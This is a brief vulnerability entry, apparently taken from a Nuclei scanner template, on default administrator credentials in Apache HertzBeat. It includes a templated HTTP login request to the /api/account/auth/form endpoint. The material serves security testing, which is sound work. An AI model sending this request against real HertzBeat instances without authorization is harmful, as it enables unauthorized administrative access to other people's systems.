# Vulnerability: Apache HertzBeat - Default Credentials
**Classification:** APACHE
**Source:** Nuclei Template (`apache-hertzbeat-default-login.yaml`)

## Description
Apache HertzBeat enables default admin (and others) credentials. An attacker can execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/account/auth/form HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"type":0,"identifier":"{{username}}","credential":"{{password}}"}
```

